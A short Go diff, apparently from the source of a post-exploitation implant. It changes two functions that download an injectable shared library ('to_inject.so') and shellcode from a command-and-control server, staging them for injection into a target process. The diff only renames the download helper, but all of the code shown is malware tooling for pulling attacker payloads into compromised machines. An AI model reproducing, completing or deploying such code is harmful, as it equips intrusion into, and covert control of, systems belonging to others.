@@ -151,7 +151,7 @@ func prepare_shared_lib() (path string, err error) {
 	if !HasRoot() {
 		path = fmt.Sprintf("%s/%s", RuntimeConfig.UtilsPath, NameTheLibrary())
 	}
-	_, err = DownloadViaCC("to_inject.so", path)
+	_, err = SmartDownload("to_inject.so", path)
 	if err != nil {
 		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
 	}
@@ -160,7 +160,7 @@ func prepare_shared_lib() (path string, err error) {
 
 // prepare the shellcode
 func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
-	sc, err := DownloadViaCC("shellcode.txt", "")
+	sc, err := SmartDownload("shellcode.txt", "")
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
